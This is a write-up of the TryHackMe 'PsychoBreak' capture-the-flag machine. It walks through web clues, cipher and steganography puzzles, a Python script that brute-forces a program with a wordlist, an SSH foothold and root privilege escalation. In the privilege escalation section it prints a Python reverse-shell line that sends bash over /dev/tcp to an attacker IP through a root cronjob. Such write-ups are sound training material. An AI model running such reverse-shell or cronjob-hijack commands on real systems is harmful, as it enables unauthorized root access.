---
tags: crypto, steg, subprocess, python
share: True
---

# THM: PsychoBreak

***Overview**: Psychobreak is a Linux machine on tryhackme rated as easy. This machine uses a series of  cryptography and steganography techniques to work through it's challenges but what is particularly interesting is exploiting a cronjob using subprocess in python to escalate privileges to root.*


> Hello fellow readers, 
I guess it's been a while I uploaded any con;ltent, sorry about that. Well  I decided to upload a writeup for this machine cause I found it particularly interesting but what I wanted to specifically share was using subprocess in python to gain a revere shell, I really hope you enjoy this writeup!!
	Much love,
	Gr4y.

#### Scanning and Enumeration
- As usual, I start with a port scan with Nmap
![](Psychobreak_assets/Pasted%20image%2020230421130725.png)
- Then I go for a full portscan using masscan, this verified we do have just 3 ports open
```shell
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535 10.10.121.146 --rate=1000 -e tun0 > psychobreak

┌──(kali㉿kali)-[~/THM]
└─$ cat psychobreak    
Discovered open port 21/tcp on 10.10.121.146                                   
Discovered open port 80/tcp on 10.10.121.146                                   
Discovered open port 22/tcp on 10.10.121.146
```
#### Web
- we go to the web page and this is how the site looks like
![](Psychobreak_assets/Pasted%20image%2020230421132523.png)
![](Psychobreak_assets/Pasted%20image%2020230421133737.png)
- Viewing the comments, we see a clue which looks like a directory path
![](Psychobreak_assets/Pasted%20image%2020230421133847.png)
- then visiting that directory, we are presented with this
![](Psychobreak_assets/Pasted%20image%2020230421134040.png)
- we found a key, so clicking on the link we a presented with that key to the locker room

![](Psychobreak_assets/Pasted%20image%2020230421134346.png)
- we can also see the key if we inspect the JavaScript file
![](Psychobreak_assets/Pasted%20image%2020230421134641.png)
- If we don't enter the key quickly, then it gets too late because of the timer
![](Psychobreak_assets/Pasted%20image%2020230421134512.png)
- Entering a key we got access to the locker room and another clue
![](Psychobreak_assets/Pasted%20image%2020230421134740.png)![](Psychobreak_assets/Pasted%20image%2020230421134845.png)
- now the clue we get is this piece of text Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv
![](Psychobreak_assets/Pasted%20image%2020230421135059.png)
- so Using a cipher identifier, we get that the possible cipher encoding is the Atbash Cipher
![](Psychobreak_assets/Pasted%20image%2020230421135330.png)
- Decrypting from Atbash [https://www.dcode.fr/atbash-cipher](https://www.dcode.fr/atbash-cipher), we got the key to access the map
- Now that we have access to the map, we will see that we have already been to the first 2 and we have the next directory to move too
![](Psychobreak_assets/Pasted%20image%2020230421135511.png)
- Moving to the next directory, we are presented with the below
![](Psychobreak_assets/Pasted%20image%2020230421135734.png)
![](Psychobreak_assets/Pasted%20image%2020230421135753.png)
- Inspecting the page, we are presented with our next clue
![](Psychobreak_assets/Pasted%20image%2020230421140127.png)
- "Search through Me", Hmmm, so after performing different forms of steganographic techniques in the presented images, and gaining nothing why don't we do a directory scan on the SafeHeaven directory, and we got the keeper sub directory
```shell
┌──(kali㉿kali)-[~/THM]
└─$ ffuf -w wordlist-part01.txt:FUZZ -u http://10.10.1.159/SafeHeaven/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.1.159/SafeHeaven/FUZZ
 :: Wordlist         : FUZZ: /home/kali/THM/wordlist-part01.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 324ms]
    * FUZZ: keeper
```

- going to that directory, we are presented with this
![](Psychobreak_assets/Pasted%20image%2020230422100710.png)
- Now in other to escape the keeper, we have to find the specific location of this image
![](Psychobreak_assets/Pasted%20image%2020230422100930.png)
- so now we will perform a reverse image search on  that image, and get the name of the building as St. Augustine Lighthouse
![](Psychobreak_assets/Pasted%20image%2020230423103203.png)
- Entering the name of that building, we get the keeper key
![](Psychobreak_assets/Pasted%20image%2020230422170603.png)
- After getting the key, we move to the Abandoned room Next
![](Psychobreak_assets/Pasted%20image%2020230422170817.png)
- then we click on go further and when we inspect, we find another clue
![](Psychobreak_assets/Pasted%20image%2020230422174512.png)
- so after some thought, we then tried to use shell as a parameter query and it worked, but only ls could be executed or is allowed
![](Psychobreak_assets/Pasted%20image%2020230422174229.png)
- so then we listed the contents of the previous directory using `ls+..` and got another possible directory
![](Psychobreak_assets/Pasted%20image%2020230422181119.png)
- go to that directory, we are presented with a zip file and a text file
![](Psychobreak_assets/Pasted%20image%2020230422181158.png)
- viewing the text file
![](Psychobreak_assets/Pasted%20image%2020230422181232.png)
- extracting the zip file contents we get a message in a text file and an image file
![](Psychobreak_assets/Pasted%20image%2020230422181519.png)
- viewing the text file, we see we have a message from Joseph
![](Psychobreak_assets/Pasted%20image%2020230422181614.png)
#### Steg
- we can't view the image but, viewing the metadata of the file, we can see that we can possibly extract some data from that image
![](Psychobreak_assets/Pasted%20image%2020230422182135.png)
- Extracting from the image, we get another image that is viewable and a wav file containing morse code
![](Psychobreak_assets/Pasted%20image%2020230422182643.png)
![](Psychobreak_assets/Pasted%20image%2020230422183000.png)
- Decrypting the Morse code , we get a message SHOWME
![](Psychobreak_assets/Pasted%20image%2020230422190149.png)
- then we can extract another text file using sheghide and using SHOWME as the passphrase to extract file from image
![](Psychobreak_assets/Pasted%20image%2020230422200846.png)
- Now we have obtained the FTP crednetials.
- logging into the FTP server, we are able to retrieve 2 files, one which seems like an executable program and the other a dictionary file
![](Psychobreak_assets/Pasted%20image%2020230422201157.png)
- executing the program, we will see that if we enter the wrong word, it shows us Incorrect
![](Psychobreak_assets/Pasted%20image%2020230422204309.png)
- so we need to write a program executes that program and utilizes the dictionary file found by feeding each word in the wordlist to the from, and the script below did just that
```python
#/bin/python3
import subprocess

# Replace script_path with the path to your shell script
script_path = "/home/kali/THM/_Table.jpg.extracted/program"

# Replace wordlist_path with the path to your wordlist file
wordlist_path = "/home/kali/THM/_Table.jpg.extracted/random.dic"

# Open the wordlist file for reading
with open(wordlist_path) as wordlist:

    # Iterate over each line in the wordlist
    for line in wordlist:

        # Strip newline character from line
        line = line.strip()

        # Build the command to execute your shell script with the current word as an argument
        command = [script_path, line]

        # Execute the command and capture the output
        output = subprocess.check_output(command)

        # Print the output
        print(output)
```
- after a little while, we we get the correct word as kidman and we get an encoded set of numbers
![](Psychobreak_assets/Pasted%20image%2020230422204120.png)
`55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33`
- placing this in a cipher identifier, we see that the possible cipher is Multi-tap Phone (SMS)
![](Psychobreak_assets/Pasted%20image%2020230422205239.png)
![](Psychobreak_assets/Pasted%20image%2020230422205303.png)
- Decoding this we get something that seems like a password form Kidman
#### Foothold
- using the string as the password for kidman via SSH, we get foothold to the machine
![](Psychobreak_assets/Pasted%20image%2020230422205923.png)
- we finally get our user flag
![](Psychobreak_assets/Pasted%20image%2020230422205957.png)
- viewing the hidden files, we see 2 text files
![](Psychobreak_assets/Pasted%20image%2020230422210324.png)
- since the content of the first file is encoded, we analyze it and see the possible cipher as ROT-47
![](Psychobreak_assets/Pasted%20image%2020230422210620.png)
- Then decoding it, we get another message
![](Psychobreak_assets/Pasted%20image%2020230422210635.png)
```
From Kidman:

The thing I am about to tell so is top secret. No one doesn't know about this. It's the Ruvik's eye. No one can hide away from it. But I can tell you one thing search for the string *the_eye_of_ruvik* . You got to help Sebastian defeat Ruvik ...
```
#### Privilege Escalation
- Running linpeas and looking at the output
![](Psychobreak_assets/Pasted%20image%2020230422214119.png)
- we can see that a cronjob that executes a file as root is running
![](Psychobreak_assets/Pasted%20image%2020230422215242.png)
![](Psychobreak_assets/Pasted%20image%2020230422215342.png)
- we can see that the file is in our var directory
![](Psychobreak_assets/Pasted%20image%2020230422215809.png)
- looking at the file, we can see that the file imports subprocess and executes some commands
![](Psychobreak_assets/Pasted%20image%2020230422220046.png)
- we then try to gain a reverse shell with subprocess in python using to the code `subprocess.Popen(["/bin/bash", "-c", "exec /bin/bash -i &>/dev/tcp/10.8.80.123/4242 <&1"])`
![](Psychobreak_assets/Pasted%20image%2020230422221529.png)
- we can then see that we have a root shell in our listener and we finally have our root file
![](Psychobreak_assets/Pasted%20image%2020230422221556.png)

#### Defeat Ruvik
- delete Ruvik's account with `sudo userdel -r ruvik` (-r to delete the home dorectory recursively)
![](Psychobreak_assets/Pasted%20image%2020230422222126.png)


Thank you reading my writeup guys, see you next time, Much love!!